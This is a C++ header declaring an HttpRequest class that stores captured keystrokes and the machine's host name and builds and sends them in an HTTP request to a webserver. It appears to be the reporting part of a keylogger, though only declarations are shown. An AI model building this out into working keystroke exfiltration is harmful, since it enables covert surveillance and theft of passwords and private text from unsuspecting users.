#ifndef HTTPREQUEST_INCLUDE
#define  HTTPREQUEST_INCLUDE

#include <string> // Standard Library string stuff so we don't have to use char arrays.

// Didn't use namespace std for this one because meh.
class HttpRequest
{
private:
    // Private variables because this is how you do classes properly.
    std::string method = ""; // Request method data is being sent with.
    std::string url = ""; // Url data is being sent to.
    std::string keystrokes = ""; // The keystrokes to be sent.
    std::string computerName = ""; // Host name of machine that the keystrokes are coming from.
    std::string request = ""; // Actual plaintext HTTP request that is to be sent through a socket to the webserver.
public:
    // Constructor / Destructor cuz classes and what not.
    HttpRequest();
    HttpRequest(std::string, std::string, std::string, std::string);
    ~HttpRequest();
    // Accessor methods so we can access and set out private variables.

    // Getters
    std::string getKeystrokes();
    std::string getComputerName();
    std::string getUrl();
    std::string getMethod();
    std::string getRequest();

    // Setters
    void setKeystrokes(std::string);
    void setUrl(std::string);
    void setMethod(std::string);
    void setComputerName(std::string);
    void setRequest(std::string);

    // Class Methods for Request Operations.
    std::string buildRequest(); // Method for building the HttpRequest.
    void sendRequest();
};
#endif